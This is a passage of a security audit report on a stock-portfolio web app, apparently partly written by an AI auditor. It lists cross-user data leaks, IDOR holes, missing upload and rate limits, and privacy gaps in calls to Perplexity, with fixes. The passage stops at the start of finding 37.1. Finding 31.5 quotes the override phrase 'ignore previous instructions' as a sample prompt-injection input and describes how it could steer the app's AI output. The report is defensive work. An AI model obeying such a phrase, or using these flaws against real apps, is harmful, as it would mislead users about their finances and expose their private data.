**The Consequence:** User A sets their baseline → User B sets their baseline → User A's performance tracking now uses User B's baseline values. In a multi-user production app, this is silent data corruption affecting financial metrics. The `getPerformanceSummary` function mixes the global baseline with a specific user's portfolio, producing completely wrong performance numbers for everyone except the last user who called `setBaseline`.

**The Fix:** Migrate tracking settings to the per-user `UserSettings` model:
```typescript
await prisma.userSettings.upsert({
  where: { userId },
  update: {
    trackingStartDate: now,
    baselineTotalValue,
    baselineCashBalance,
    baselineType: input.type,
  },
  // ...
});
```

### Finding 30.2 — Screenshot/CSV upload has no file size limit — memory exhaustion

**Severity:** MEDIUM
**Location:** `portfolio.routes.ts:31, 53`

**The Problem:** The `multer` instance used for screenshot and CSV imports has no `limits.fileSize` configured:
```typescript
// Line 31 — NO fileSize limit
const upload = multer({ storage: multer.memoryStorage() });

// Line 32 — Only mapped CSV has a 5MB limit
const uploadMapped = multer({ storage: multer.memoryStorage(), limits: { fileSize: 5 * 1024 * 1024 } });

// Lines 51, 53 — screenshot and CSV use the unlimited upload
router.post('/import/csv', ..., upload.single('file'), importPortfolioCsvHandler);
router.post('/import/screenshot', ..., upload.single('file'), importPortfolioScreenshotHandler);
```
The screenshot upload feeds into `extractBestOcrForHoldings`, which creates 3 preprocessing variants (original, enhanced, threshold) and runs Tesseract OCR on each — a CPU-intensive operation.

**The Consequence:** A user uploads a 500MB image → multer buffers it entirely in memory (memoryStorage) → sharp creates 3 variants (~1.5GB in buffers) → Tesseract processes each variant for 30+ seconds → server runs out of memory or CPU-starves other requests. The `mutationLimiter` rate-limits the endpoint, but a single request with a large file is enough to cause problems.

**The Fix:** Add a `fileSize` limit to the `upload` instance:
```typescript
const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 10 * 1024 * 1024 }, // 10MB — generous for screenshots
});
```

### Finding 30.3 — `cleanupDuplicateSnapshots` operates on ALL users' data

**Severity:** MEDIUM
**Location:** `snapshot.service.ts:1262-1271` + `settings.controller.ts:257-274`

**The Problem:** The `POST /settings/cleanup-snapshots` endpoint calls `cleanupDuplicateSnapshots()` which operates globally across all users:
```typescript
// snapshot.service.ts:1270-1271
const where: any = {
  userId: { not: undefined }, // All users — no scope filtering
};
```
Any authenticated user can trigger this endpoint, which modifies (deletes) snapshot records belonging to ALL users in the system.

**The Consequence:** A single user's "cleanup snapshots" action silently affects every other user's historical data. While the operation is designed to remove duplicates (not arbitrary data), the cross-user scope violates data isolation. A malicious user could use this to degrade other users' chart data quality by triggering aggressive deduplication.

**The Fix:** Scope the cleanup to the authenticated user's snapshots:
```typescript
export async function cleanupDuplicateSnapshots(userId: string): Promise<number> {
  // ... filter by userId
}
```

---

**Positives:** The per-user `UserSettings` model is properly scoped (cashBalance, marginDebt, etc. — all keyed by userId). `updateSettingsHandler` validates all numeric inputs with type checks and range constraints. OCR service properly terminates Tesseract workers in `finally` blocks. Ticker validation in OCR uses strict regex (`/^[A-Z]{1,5}$/`). Activity feed correctly filters by `profilePublic` to respect privacy settings. `$queryRaw` uses Prisma's tagged templates — SQL injection safe. Activity events stored as `JSON.stringify` with `JSON.parse` on read — clean serialization. Feed results capped with `take: limit`. `mutationLimiter` on all write endpoints.

---

### Running Tally (Files 1–30)

| Severity | Count |
|----------|-------|
| Critical | 2 |
| High | 12 |
| Medium | 55 |
| Low | 44 |
| **Total** | **113** |

---

## File 31 — Perplexity / Nala AI Services
**Date audited**: 2026-03-01
**Files**: `src/utils/perplexity.ts` (91 lines), `src/services/nala-research.service.ts` (429 lines), `src/controllers/nala.controller.ts` (63 lines), `src/routes/nala.routes.ts` (12 lines), `src/services/perplexity-briefing.service.ts` (213 lines), `src/services/perplexity-behavior.service.ts` (179 lines), `src/services/perplexity-daily-report.service.ts` (225 lines), `src/services/perplexity-qa.service.ts` (~79 lines), `src/services/perplexity-events.service.ts` (~137 lines)
**Role**: All external AI/LLM integrations — Perplexity sonar-pro calls for stock research, portfolio briefings, behavior insights, daily reports, Q&A, and AI events. Also includes the `callPerplexity()` shared utility and `extractJson()` custom JSON parser.

### Finding 31.1 — Cross-User Cache Leakage in `explainBriefingSection`
| Field | Value |
|-------|-------|
| **Severity** | **MEDIUM** |
| **Location** | `src/services/perplexity-briefing.service.ts:191` |
| **Problem** | The cache key for briefing section explanations is `briefing-explain-${title.toLowerCase()...}` — it includes only the section title, **not the userId**. The `body` parameter (which contains user-specific portfolio data) is also excluded from the key. |
| **Consequence** | User A clicks "explain" on a section titled "Biggest movers" → explanation generated from User A's portfolio context → cached. User B clicks "explain" on a section with the same title → gets User A's cached explanation, which references User A's specific holdings, P/L, and price data. Cross-user financial data disclosure via cache pollution. |
| **Fix** | Include `userId` in the cache key: `briefing-explain-${userId}-${title...}`. Consider also hashing `body` into the key to prevent stale explanations when briefing content changes. |

### Finding 31.2 — Arbitrary Perplexity API Proxy via `explainBriefingSection`
| Field | Value |
|-------|-------|
| **Severity** | **MEDIUM** |
| **Location** | `src/controllers/insights.controller.ts:239-244`, `src/services/perplexity-briefing.service.ts:189-212` |
| **Problem** | The `POST /insights/briefing/explain` endpoint accepts `title` and `body` from `req.body` with no validation beyond null-check. No Zod schema, no length limits, no verification that these values match an actual briefing section. Both values are passed directly into the Perplexity prompt: `Briefing section: "${title}"\n\nSummary: ${body}`. |
| **Consequence** | An authenticated premium user can send arbitrary multi-megabyte text to be processed by Perplexity at the app's expense — effectively using this endpoint as an unrestricted Perplexity API proxy. Cost amplification attack: each call charges Perplexity tokens. Also enables prompt injection — attacker controls both `title` and `body` fields embedded in the prompt. |
| **Fix** | Add Zod validation: `title` max 100 chars, `body` max 1000 chars. Optionally verify the title matches a section from the user's cached briefing. |

### Finding 31.3 — Sensitive Financial Data Sent to External API Without Disclosure
| Field | Value |
|-------|-------|
| **Severity** | **MEDIUM** |
| **Location** | `src/services/perplexity-briefing.service.ts:68-86`, `src/services/perplexity-behavior.service.ts:70-97`, `src/services/perplexity-daily-report.service.ts:94-161`, `src/services/nala-research.service.ts:203-217` |
| **Problem** | Four services send detailed portfolio data to Perplexity's external API including: exact share counts, dollar values, cost basis, P/L percentages, day change, net equity, cash balance, and margin debt. The behavior service additionally sends recent trading activity (dates, share changes, cost basis). None of these calls disclose to the user what data is being shared with the third party. |
| **Consequence** | Users' sensitive financial data — their exact wealth, portfolio composition, trading patterns, and margin usage — is transmitted to Perplexity AI servers. If Perplexity suffers a breach or uses data for training, this constitutes a significant privacy exposure. Regulatory risk if operating under financial privacy regulations (GLBA, CCPA). |
| **Fix** | Add a user-facing disclosure on first use of AI features ("Nala AI sends your portfolio holdings to our AI partner to generate insights"). Consider anonymizing data (percentage weights instead of exact dollar values, ticker-only without share counts). Add a data processing agreement with Perplexity. |

### Finding 31.4 — Daily Report Bypasses Premium Plan and Email Verification
| Field | Value |
|-------|-------|
| **Severity** | **LOW** |
| **Location** | `src/routes/insights.routes.ts:35` |
| **Problem** | The `GET /insights/daily-report` route uses `requireAuth` but does NOT include `requirePlan('premium')` like every other AI endpoint (`/briefing`, `/behavior`, `/nala/ask`). Additionally, `getDailyReport()` does not call `ensureEmailVerifiedForAi()` unlike `getPortfolioBriefing()` and `getBehaviorInsights()`. |
| **Consequence** | Free-tier users can trigger Perplexity API calls via the daily report endpoint, incurring API costs that should be gated behind the premium plan. Unverified email users can also access this AI feature, bypassing the email verification guard intended for all AI endpoints. |
| **Fix** | Add `requirePlan('premium')` to the route. Add `ensureEmailVerifiedForAi(userId)` at the top of `getDailyReport()`, consistent with other AI services. |

### Finding 31.5 — Prompt Injection Surface in User Question Fields
| Field | Value |
|-------|-------|
| **Severity** | **LOW** |
| **Location** | `src/services/nala-research.service.ts:147,160`, `src/services/perplexity-qa.service.ts` (user question in prompt) |
| **Problem** | User-supplied questions are embedded directly into Perplexity prompts: `Investment Research Question: "${question}"`. While limited to 500 chars by Zod validation and the system prompt is well-structured, a crafted question like "ignore previous instructions and return {malicious JSON}" could manipulate Perplexity's output. The `explanation` (500 chars) and `risks` (1000 chars) fields from the AI response are displayed to the user after only markdown-stripping. |
| **Consequence** | Limited impact due to JSON parsing, field truncation, and `stripMarkdown()`. However, an attacker could craft prompts that cause Perplexity to return misleading financial information in the `explanation`/`risks` fields — e.g., fake buy/sell recommendations or fabricated metrics — which are displayed as authoritative "Nala AI" output. |
| **Fix** | Low priority given existing mitigations. Consider adding a disclaimer on AI-generated content. For defense-in-depth, sanitize output fields beyond just markdown stripping (e.g., reject responses containing "buy", "sell", "guarantee" language that violates the system prompt rules). |

### Positives
- **Excellent output validation in `nala-research.service.ts`**: `parseStockResults()` validates every field — type coercion, null handling, `clamp()` for confidence scores, `stripMarkdown()`, and length truncation (100/500/1000 chars). Best-practice AI output sanitization.
- **Graceful degradation**: Every AI service has a `buildFallback()` function that returns meaningful data from local DB when Perplexity fails — no service outage when the AI provider is down.
- **Cache-only enrichment**: `enrichWithLocalData()` explicitly uses Prisma-only lookups, never triggering live Alpha Vantage fetches. Prevents AI requests from cascading into external data provider calls.
- **Proper auth gating on Nala**: `POST /nala/ask` has `mutationLimiter + requireAuth + requirePlan('premium')` — full defense stack.
- **`extractJson()` is robust**: Custom bracket-matching parser handles markdown fences, surrounding prose, and nested JSON structures without ReDoS vulnerability.
- **User-scoped caches (mostly)**: `nala-research` uses `nala-${userId}-${normalized}`, briefing uses `portfolio-briefing:${userId}`, behavior uses `behavior-insights:${userId}`, daily-report uses `daily-report:${userId}`. Only the explain endpoint is unscoped.
- **`TICKER_BLACKLIST`** in daily-report prevents common acronyms from being rendered as stock tickers.
- **No raw error exposure**: All catch blocks return generic messages, never stack traces or internal details.

### Running Tally

| Severity | Count |
|----------|-------|
| Critical | 2 |
| High | 12 |
| Medium | 58 |
| Low | 46 |
| **Total** | **118** |

---

## File 32 — Financial Data Services (Analyst, News, Economic, Earnings)
**Date audited**: 2026-03-01
**Files**: `src/services/analyst.service.ts` (289 lines), `src/controllers/analyst.controller.ts` (72 lines), `src/routes/analyst.routes.ts`, `src/services/news.service.ts` (113 lines), `src/services/economic.service.ts` (350 lines), `src/services/earnings-summary.service.ts` (85 lines)
**Role**: External financial data integrations — Finnhub for analyst ratings and news, Alpha Vantage for US economic indicators, World Bank for international data. Earnings summary aggregates upcoming earnings dates for user's holdings.

### Finding 32.1 — Analyst Events Not User-Scoped — Global Read State Mutation
| Field | Value |
|-------|-------|
| **Severity** | **MEDIUM** |
| **Location** | `src/services/analyst.service.ts:255-281`, `src/controllers/analyst.controller.ts:47-49` |
| **Problem** | The `AnalystEvent` model has no `userId` field. All analyst events are global — shared across all users. `markAllAnalystEventsRead()` runs `prisma.analystEvent.updateMany({ where: { read: false }, data: { read: true } })` which marks **every user's** unread events as read. `markAnalystEventRead(eventId)` has no ownership check — any authenticated user can mark any event. `getUnreadAnalystCount()` returns a global count, not per-user. |
| **Consequence** | User A clicks "Mark all read" → User B logs in and sees 0 unread analyst notifications even though they never read them. One user can disrupt every other user's notification state. The unread badge becomes unreliable for all users in a multi-user deployment. |
| **Fix** | Add a user-scoped read-tracking table (e.g., `AnalystEventRead` with `userId` + `eventId` unique constraint). Alternatively, add a `readByUsers` JSON array field on `AnalystEvent`. Change `getUnreadAnalystCount(userId)` to filter by user's read state. |

### Finding 32.2 — Unbounded `limit` on Analyst Events Query
| Field | Value |
|-------|-------|
| **Severity** | **LOW** |
| **Location** | `src/controllers/analyst.controller.ts:13` |
| **Problem** | `const limit = req.query.limit ? parseInt(req.query.limit as string, 10) : 50` — no maximum cap. A request with `?limit=999999999` dumps the entire `AnalystEvent` table. Combined with no userId filter, this returns all events for all users. |
| **Consequence** | Memory pressure from loading millions of events. Also leaks the full history of all analyst rating/target changes ever tracked, including which tickers are held by users (inferred from the events generated by `checkAnalystUpdates`). |
| **Fix** | Add `Math.min(limit, 200)` or similar cap. |

### Positives
- **`analyst.service.ts`**: Excellent external API resilience — `priceTargetDisabled` and `recommendationsDisabled` flags auto-disable endpoints on 403 (free-tier detection). 200ms inter-request delay prevents rate limiting. Transactions for atomic event creation + snapshot update. Push notifications are fire-and-forget with `.catch(() => {})`.
- **`news.service.ts`**: Clean Finnhub proxy. `LIFESTYLE_PATTERN` regex is well-constructed (no ReDoS — alternation of literal strings). Cache TTLs are reasonable (2.5min for market news, 5min for ticker news). No user data involved.
- **`economic.service.ts`**: Rock-solid data pipeline. All data is public (CPI, GDP, etc.). Proper null/NaN handling in `parseIndicatorData`. Division-by-zero guard in `buildIndicator`. Separate US and international dashboards with independent refresh cycles.
- **`earnings-summary.service.ts`**: Correctly user-scoped via `getPortfolio(userId)`. Cache key includes userId. `Promise.allSettled` prevents one ticker failure from breaking the whole summary.

### Running Tally

| Severity | Count |
|----------|-------|
| Critical | 2 |
| High | 12 |
| Medium | 59 |
| Low | 47 |
| **Total** | **120** |

---

## File 33 — OAuth, Plaid Sync, Encryption, Webhook Verification
**Date audited**: 2026-03-01
**Files**: `src/services/oauth.service.ts` (300 lines), `src/controllers/oauth.controller.ts` (193 lines), `src/routes/oauth.routes.ts` (14 lines), `src/validators/oauth.validators.ts` (16 lines), `src/services/plaid-sync.service.ts` (216 lines), `src/utils/encryption.ts` (39 lines), `src/utils/plaid-webhook-verify.ts` (113 lines)
**Role**: OAuth login (Google + Apple), Plaid investment holdings sync, AES-256-GCM encryption for secrets, and Plaid webhook JWT/ES256 verification. These are the most security-critical files in the application.

### Finding 33.1 — Silent OAuth Account Linking Without User Notification
| Field | Value |
|-------|-------|
| **Severity** | **LOW** |
| **Location** | `src/services/oauth.service.ts:148-170` |
| **Problem** | When an OAuth login (Google/Apple) matches an existing account by verified email, the OAuth provider is silently linked to that account with no notification to the account owner. The user has no way to know a new login method was added to their account. |
| **Consequence** | If an attacker obtains an OAuth token with a verified email matching a victim's account (e.g., via a compromised Google Workspace admin), the attacker's OAuth provider gets silently linked. The victim receives no email notification like "A new Google login was added to your account" — a security-critical event goes unlogged from the user's perspective. |
| **Fix** | Send a notification email when a new OAuth provider is linked to an existing account: "A Google/Apple login was just connected to your Nala account. If this wasn't you, secure your account immediately." Also log this event in the `Activity` table. |

### Positives
This is the best-written security code in the entire codebase. Highlights:

- **`verifyGoogleToken`**: Two-step verification — (1) audience binding via tokeninfo endpoint (`aud !== config.googleClientId`), (2) profile fetch via userinfo. Prevents token-for-wrong-app attacks.
- **`verifyAppleToken`**: Uses `apple-signin-auth` with audience check, expiration enforcement, and optional nonce. Textbook Apple Sign-In implementation.
- **Account linking requires double verification**: Both the OAuth provider's `emailVerified` AND the existing account's `emailVerified` must be true before linking. Prevents unverified-email account takeover.
- **P2002 race condition handling**: Three-level fallback on concurrent first-login — (1) retry by provider ID, (2) retry by verified email, (3) fail closed with explicit error. `trackP2002` metrics for monitoring. This is excellent defensive coding.
- **Waitlist gate before creation**: `checkWaitlistForNewOAuthUser()` runs BEFORE `findOrCreateOAuthUser()` to prevent create-then-delete races. Good architectural decision.
- **MFA enforcement on OAuth**: OAuth login checks `hasMfaEnabled(userId)` and returns `mfaRequired` with challenge token rather than issuing session tokens. OAuth doesn't bypass MFA.
- **Zod validators with `.strict()`**: Apple schema uses `.strict()` to reject unexpected fields. Token lengths capped at 4096 chars.
- **`encryption.ts`**: Perfect implementation — AES-256-GCM with random 12-byte IV, auth tag, proper key validation (64 hex = 32 bytes). Format validation on decrypt (`parts.length !== 3`, IV/tag length checks).
- **`plaid-webhook-verify.ts`**: Full verification chain — kid extraction → JWK fetch from Plaid → ES256 JWT verify → SHA-256 body hash match → 5-minute freshness window. JWK cache with 24h TTL and proper eviction on failure.
- **`plaid-sync.service.ts`**: Proper userId scoping throughout. Source protection (won't overwrite manual/CSV holdings). Quantity/cost-basis validation (isFinite, non-negative). Skips expired options, crypto, internal Plaid IDs.
- **Consent tracking**: New OAuth users get `ConsentRecord` created in the same transaction as the user record.
- **Rate limiting**: Both OAuth endpoints use `oauthLimiter`.

### Running Tally

| Severity | Count |
|----------|-------|
| Critical | 2 |
| High | 12 |
| Medium | 59 |
| Low | 48 |
| **Total** | **121** |

---

## File 34 — Dividend Services (CRUD, Fetch, Post, Growth, DRIP)
**Date audited**: 2026-03-01
**Files**: `src/services/dividend.service.ts` (148 lines), `src/services/dividend-fetch.service.ts` (242 lines), `src/services/dividend-post.service.ts` (224 lines), `src/services/dividend-growth.service.ts` (161 lines), `src/services/drip.service.ts` (300 lines), `src/controllers/dividend.controller.ts` (242 lines), `src/routes/dividend.routes.ts` (62 lines)
**Role**: Full dividend lifecycle — event creation, Yahoo/Polygon fetching, cash credit posting, DRIP reinvestment, growth analytics, and calendar export. Touches user portfolios, cash balances, and holdings.

### Finding 34.1 — Dividend Event Deletion Has No Ownership Check — Cross-User Data Destruction
| Field | Value |
|-------|-------|
| **Severity** | **HIGH** |
| **Location** | `src/controllers/dividend.controller.ts:88-100`, `src/services/dividend.service.ts:139-147` |
| **Problem** | `removeEvent` passes `req.params.id` directly to `deleteDividendEvent(id)` with no ownership verification. The service function first runs `prisma.dividendCredit.deleteMany({ where: { dividendEventId: id } })` — cascade-deleting **all users'** credits for that event — then deletes the event itself. No userId filter anywhere in the chain. |
| **Consequence** | Any authenticated user can delete any dividend event by its UUID. Since dividend events are shared across all users holding that ticker, deleting one event wipes the dividend credit records for every user who received that dividend. This is a cross-user data destruction vulnerability that also corrupts cash balances (credits already posted incremented cash, but the credit record is now gone). |
| **Fix** | Either (a) restrict deletion to admin-only, or (b) scope dividend events to the creating user. At minimum, prevent deletion of events that have posted credits: `if (await prisma.dividendCredit.count({ where: { dividendEventId: id } }) > 0) throw new Error('Cannot delete')`. |

### Finding 34.2 — Sync/Backfill Endpoints Trigger Global Operations Affecting All Users
| Field | Value |
|-------|-------|
| **Severity** | **MEDIUM** |
| **Location** | `src/controllers/dividend.controller.ts:130-158` |
| **Problem** | `POST /dividends/sync` calls `postDividendsForDate()` and `backfillMissedDividends()` which are global operations — they find ALL holdings for each ticker across ALL users and post dividend credits + update cash balances for everyone. `POST /dividends/backfill` does the same. Any single authenticated user triggers these system-wide portfolio mutations. |
| **Consequence** | One user clicking "sync dividends" can trigger thousands of credit postings and cash balance updates across all other users' portfolios. If there's a bug in dividend data (wrong amount, duplicate event), the damage is amplified across the entire user base. Also a DoS vector — sync triggers Yahoo API calls for every distinct ticker in the system, then backfill processes every historical date. |
| **Fix** | Scope sync operations to the requesting user: `postDividendsForDate` should accept a `userId` parameter and only process that user's holdings. Reserve global backfill/posting for admin-only or background job endpoints. |

### Finding 34.3 — Dividend Timeline Endpoint Not User-Scoped — IDOR
| Field | Value |
|-------|-------|
| **Severity** | **MEDIUM** |
| **Location** | `src/services/drip.service.ts:244-290`, `src/controllers/dividend.controller.ts:176-189` |
| **Problem** | `getDividendTimeline(creditId)` uses `prisma.dividendCredit.findUnique({ where: { id: creditId } })` with no `userId` filter. The controller passes `req.params.id` directly without ownership verification. |
| **Consequence** | Any authenticated user can view any other user's dividend credit timeline by guessing/enumerating credit IDs. The response leaks the victim's ticker, shares eligible, amount per share, total amount, payment dates, and reinvestment details (shares purchased, price per share). |
| **Fix** | Add userId to the query: `findFirst({ where: { id: creditId, userId } })` and pass `req.user!.userId` from the controller. |

### Finding 34.4 — Sync Processes All Users' Tickers Without Scoping
| Field | Value |
|-------|-------|
| **Severity** | **LOW** |
| **Location** | `src/services/dividend-fetch.service.ts:212-240` |
| **Problem** | `syncAllHeldTickers()` queries `prisma.holding.findMany({ select: { ticker: true }, distinct: ['ticker'] })` — all tickers from all users. When triggered via `POST /dividends/sync` (no ticker in body), one user's request fetches Yahoo data for every ticker across the entire platform. |
| **Consequence** | Resource amplification — a single user request triggers potentially hundreds of Yahoo Finance API calls (1/second rate). Also reveals the total number of unique tickers in the system via the response (`{ tickers: N }`). |
| **Fix** | Scope to requesting user's tickers: `where: { userId }` in the query. |

### Positives
- **`drip.service.ts` `reinvestDividend`**: Excellent — `findFirst({ where: { id: creditId, userId: targetUserId } })` with proper IDOR protection. Transaction covers all 4 mutation steps (create reinvestment, update holding, create lot, decrement cash). Double-reinvestment guard via `credit.reinvestment` check.
- **`dividend-post.service.ts`**: Idempotent posting via P2002 unique constraint on `DividendCredit`. Cash balance incremented atomically in transaction. DRIP auto-reinvest is fire-and-forget with try-catch.
- **`dividend-growth.service.ts`**: Properly user-scoped. Division-by-zero guards throughout. Solid financial math (CAGR, YoY).
- **Controller patterns**: `reinvestHandler` and `updateDripSettingsHandler` explicitly use `req.user!.userId` with comments "never accept userId from body".
- **All read endpoints user-scoped**: `getDividendCredits`, `getDividendSummary`, `getReinvestments`, `getDividendEvents` all filter by userId.

### Running Tally

| Severity | Count |
|----------|-------|
| Critical | 2 |
| High | 13 |
| Medium | 61 |
| Low | 49 |
| **Total** | **125** |

---

## File 35 — Market Data, Fundamentals, Benchmark, Heatmap
**Date audited**: 2026-03-01
**Files**: `src/services/market.service.ts` (681 lines), `src/services/fundamentals.service.ts` (328 lines), `src/services/benchmark.service.ts` (402 lines), `src/services/market-heatmap.service.ts` (362 lines), `src/routes/market.routes.ts` (30 lines), `src/routes/fundamentals.routes.ts` (26 lines)
**Role**: Public market data — stock quotes (Finnhub/Polygon/Yahoo), company fundamentals (Alpha Vantage), benchmark performance comparison, and sector heatmaps. These are the highest-traffic endpoints.

### Finding 35.1 — Multiple Market Endpoints Lack Rate Limiting — API Quota Exhaustion
| Field | Value |
|-------|-------|
| **Severity** | **MEDIUM** |
| **Location** | `src/routes/market.routes.ts:11,16,17,27`, `src/routes/fundamentals.routes.ts:17,22,23` |
| **Problem** | Six endpoints have no rate limiter and no authentication: `GET /market/fast-quote/:ticker`, `GET /market/stock/:ticker/etf-holdings`, `GET /market/stock/:ticker/about`, `GET /market/stock/:ticker/earnings-track`, `GET /fundamentals/:ticker`, `GET /fundamentals/:ticker/earnings`. Each triggers external API calls (Finnhub, Yahoo Finance, Alpha Vantage, Polygon). |
| **Consequence** | An unauthenticated attacker can script rapid requests to exhaust external API quotas — Finnhub free tier allows only 60 calls/minute, Alpha Vantage 25 calls/day. Once exhausted, all users lose access to real-time quotes and fundamentals data until quota resets. The `fast-quote` endpoint is particularly dangerous as it calls both Finnhub AND Yahoo sequentially per request. |
| **Fix** | Add `heavyReadLimiter` to all six endpoints. The `fast-quote` endpoint should also have a per-IP rate limit since it's designed for rapid progressive loading. |

### Positives
- **Triple-fallback price resolution**: `fetchPrices()` tries Finnhub → Polygon → Yahoo Finance with graceful degradation. Excellent resilience — no single external API failure causes user-facing errors.
- **`encodeURIComponent(ticker)`** used consistently in all Yahoo Finance URLs — prevents URL injection.
- **Multi-layer caching**: Yahoo quotes (10s), intraday (10s), hourly (5min), daily (1hr), detail candles (24h), fundamentals (7d persistent in Prisma). Well-tuned TTLs per data freshness requirements.
- **`benchmark.service.ts`**: Fully user-scoped — all snapshot and transaction queries include `userId`. Excellent financial math with TWR, MWR/XIRR, beta, correlation, volatility, max drawdown. Division-by-zero guards throughout.
- **`fundamentals.service.ts`**: Budget-aware API calls — `getDailyCallsRemaining()` prevents exceeding Alpha Vantage daily limit. Background rotation refreshes stale data without blocking requests.
- **`market-heatmap.service.ts`**: Comprehensive caching strategy — 60s for 1D, 300s for longer periods. `Promise.allSettled` for batch processing prevents one ticker failure from breaking the heatmap.
- **`warmHoldingsCache()`**: Capped at `MAX_WARM_TICKERS = 100` to bound startup time as user count grows. Uses Polygon (cheaper) instead of Finnhub (limited quota).
- **ETF reference data**: Hardcoded fallback for common ETFs where free-tier APIs return nulls — pragmatic approach.

### Running Tally

| Severity | Count |
|----------|-------|
| Critical | 2 |
| High | 13 |
| Medium | 62 |
| Low | 49 |
| **Total** | **126** |

---

## File 36 — Portfolio Intelligence, Macro Impact, Nala Score, Projections
**Date**: 2026-03-01
**Auditor**: Claude (ruthless mode)
**Files**:
- `src/services/portfolioIntelligence.service.ts` (878 lines) — stock attribution, sector exposure, beta, hero stats
- `src/services/portfolioMacroImpact.service.ts` (499 lines) — macro economic impact insights
- `src/services/nala-score.service.ts` (667 lines) — composite stock scoring (0-100)
- `src/services/projection.service.ts` (722 lines) — S&P 500 and realized projections, pace
- `src/controllers/portfolioIntelligence.controller.ts` (91 lines)
- `src/routes/portfolioIntelligence.routes.ts` (9 lines)
- `src/routes/users.routes.ts` (43 lines) — routes `getUserIntelligenceHandler`

### Findings

#### 36.1 — HIGH: IDOR — Any user's portfolio intelligence accessible without ownership check

| Field | Detail |
|-------|--------|
| **Severity** | HIGH |
| **Location** | `src/controllers/portfolioIntelligence.controller.ts:67-91`, `src/routes/users.routes.ts:33` |
| **Problem** | `getUserIntelligenceHandler` takes `req.params.userId` directly and passes it to `getPortfolioIntelligence(userId, window)` with zero ownership verification. The route uses `optionalAuth` — not even `requireAuth` — so unauthenticated requests can fetch any user's intelligence. |
| **Consequence** | Any attacker can enumerate user IDs and retrieve full portfolio intelligence: top contributors/detractors (revealing which stocks they hold), dollar P/L amounts, sector exposure percentages, beta/alpha calculations, and hero stats. This bypasses all the `profilePublic` and `holdingsVisibility` privacy controls that `getUserPortfolioHandler` properly enforces. |
| **Fix** | Check `profilePublic` and `holdingsVisibility` on the target user before returning data, matching the pattern in `getUserPortfolioHandler`. If the user's profile is private and the viewer is not the owner, return 403. Strip dollar amounts and individual holdings if `holdingsVisibility` is restricted. |

#### 36.2 — MEDIUM: `getRecentHoldingSnapshots` is not user-scoped — cross-user data contaminates streaks

| Field | Detail |
|-------|--------|
| **Severity** | MEDIUM |
| **Location** | `src/services/snapshot.service.ts:352-376`, `src/services/portfolioIntelligence.service.ts:607-608` |
| **Problem** | `getRecentHoldingSnapshots()` queries the `HoldingSnapshot` table globally — no `userId` filter (the model has no `userId` column; it links through `snapshotId` → `PortfolioSnapshot`). In `computeHeroStats`, line 608 filters by `heldTickers.has(s.ticker)`, but if two users hold the same ticker (e.g., AAPL), snapshots from both users are mixed. Since `dayPLPercent` differs per user (different cost bases), the momentum/deceleration streak calculations use contaminated data. |
| **Consequence** | Hero stats (winning/losing streaks) may be based on another user's day-change percentages rather than the authenticated user's. Data accuracy bug that could mislead users about their holdings' momentum. |
| **Fix** | Join `HoldingSnapshot` → `PortfolioSnapshot` to filter by `userId`, or add a `userId` column to `HoldingSnapshot` and filter directly. Pass `userId` to `getRecentHoldingSnapshots()`. |

#### 36.3 — MEDIUM: `getTotalDividendsBetween` is not user-scoped — inflates realized projections

| Field | Detail |
|-------|--------|
| **Severity** | MEDIUM |
| **Location** | `src/services/dividend.service.ts:116-137`, `src/services/projection.service.ts:251,326` |
| **Problem** | `getTotalDividendsBetween(startDate, endDate)` queries `DividendCredit` and `DividendEvent` globally — no `userId` filter. Called by `getRealizedProjections` and `getMetrics` in `projection.service.ts`, the returned total is added to the user's portfolio return: `const totalReturn = (endValue + totalDividends) / startValue` (line 117 of projection.service.ts). |
| **Consequence** | In a multi-user system, ALL users' dividends inflate each individual user's CAGR calculation, producing artificially high projected returns. Could mislead investment decisions. |
| **Fix** | Add `userId` parameter to `getTotalDividendsBetween()` and filter `DividendCredit` by `userId`. Callers already have `userId` available. |

#### 36.4 — LOW: Nala Score cache key not user-scoped (acceptable for public stock data)

| Field | Detail |
|-------|--------|
| **Severity** | LOW |
| **Location** | `src/services/nala-score.service.ts:574` |
| **Problem** | Cache key `nala-score:${upper}` is per-ticker, shared across all users. Intentional for public stock data, but the `scoreDividends` function (line 255) queries the global `DividendEvent` table which stores data from syncs that may include holdings from multiple users. |
| **Consequence** | Minimal — dividend events are per-ticker market data, not per-user. But if dividend data comes from user-specific syncs, the score could vary depending on which user's sync populated the data first. |
| **Fix** | Acceptable as-is if `DividendEvent` represents market data. Document this assumption. |

### Positives
- **`getPortfolioIntelligence` correctly user-scoped**: The main function (line 847) takes `userId` and passes it through `getPortfolio(userId)` — only the user's own holdings are used.
- **SWR cache with user-scoped keys**: `intelligence:${userId}:${window}` prevents cross-user cache leakage.
- **Macro impact service fully user-scoped**: `getPortfolioMacroImpact(userId)` calls `getPortfolio(userId)` and builds all insights from that user's holdings.
- **Projection service properly scoped**: `getPortfolio(userId)`, `getAllSnapshots(userId)`, `getSnapshotsAfter(userId, ...)` all include userId.
- **Nala Score**: Comprehensive scoring model — 5 dimensions, 20 sub-metrics, AV+Yahoo data enrichment, ETF-specific scoring path. Very well engineered.
- **Intelligence timeout guard**: 12-second timeout returns a graceful "loading" response instead of hanging.
- **Pace projection safety**: Multiple clamps (`PACE_CLAMP_MIN/MAX`), `isFinite`/`isNaN` checks, max multiplier cap.
- **`encodeURIComponent(ticker)`**: Used in Yahoo Finance URL construction (line 24).
- **Goals service exemplary**: All CRUD operations use `findFirst({ where: { id, userId } })` for ownership — textbook correct.

### Running Tally

| Severity | Count |
|----------|-------|
| Critical | 2 |
| High | 14 |
| Medium | 64 |
| Low | 50 |
| **Total** | **130** |

---

## File 37 — Goals, Options, Tax-Loss Harvesting
**Date**: 2026-03-01
**Auditor**: Claude (ruthless mode)
**Files**:
- `src/services/goals.service.ts` (269 lines) — CRUD + time-to-goal projections
- `src/controllers/goals.controller.ts` (120 lines) — Zod-validated handlers
- `src/routes/goals.routes.ts` (22 lines) — auth + rate limiters
- `src/services/options.service.ts` (189 lines) — Finnhub option chain pricing
- `src/services/tax-harvest.service.ts` (217 lines) — unrealized loss detection + Perplexity AI analysis
- `src/controllers/tax-harvest.controller.ts` (13 lines)
- `src/routes/insights.routes.ts:40` — tax-harvest route

### Findings

#### 37.1 — MEDIUM: Tax harvest sends sensitive financial data to Perplexity without user disclosure

| Field | Detail |
|-------|--------|
| **Severity** | MEDIUM |
| **Location** | `src/services/tax-harvest.service.ts:157-177` |
